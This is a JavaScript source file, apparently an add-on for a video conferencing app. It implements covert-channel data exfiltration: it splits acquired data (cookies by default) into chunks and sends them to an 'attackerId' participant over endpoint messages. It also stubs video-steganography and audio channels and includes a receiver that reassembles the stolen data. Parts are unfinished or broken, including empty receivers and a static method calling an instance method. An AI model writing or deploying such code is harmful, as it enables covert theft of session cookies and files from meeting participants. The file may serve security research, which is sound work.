/* global APP, splitString, getDefaultSettings */
import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import VideoSteganoEffect from './VideoSteganoEffect';


export const defaultConfigurationValues = {
    method: 'plain',
    dataType: 'cookies',
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    static usePlain(data, attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            payload: data
        });
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object, options: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, options));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static async useVideo(acquiredData, usedMethod) {
        const localVideo = APP.conference.localVideo;
        const steganoEffect = await this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod);

        await localVideo.setEffect(steganoEffect);
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static async useAudio(data) {
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;
        const mixerEffect = new AudioMixerEffect(desktopAudio);


        await localAudio.setEffect(mixerEffect);
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': ExtractionCovertChannelMethods.usedPlain,
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio
    };

    /**
     * Receiving data using video stream
     */
    static async usedVideo(user) {
        // define MediaRecorder of received stream
        const mediaRecorder = new MediaRecorder(user._tracks[0].stream);

        mediaRecorder.ondataavailable = async blob => {
            console.log(await blob.data.arrayBuffer());
        };
        mediaRecorder.start(100);
    }

    /**
     * Receiving data using audio stream
     */
    static async usedAudio(user) {}

    /**
     * TODO: change this
     * not used anymore
     * Receiving data using audio stream
     */
    static async usedPlain(user) {}
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this._fileBuffer = [];
        this.communicationEnded = false;
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        if (this._fileBuffer?.length) {
            return this._fileBuffer?.reduce((first, second) => first + second);
        }

        return '';
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    async sendAll(data, attackerId, dataSize = data.length) {
        // If the method can loose data through the transition send the final size of sent file.
        if (this.configuration.method !== 'plain') {
            CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
        }
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
        }
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either plain text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receivePlainData(recievedData, event) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (event) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                event.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData,
                        config: this.configuration
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        ExtractionCovertChannelMethods.options[this.configuration.method](user);
    }
}
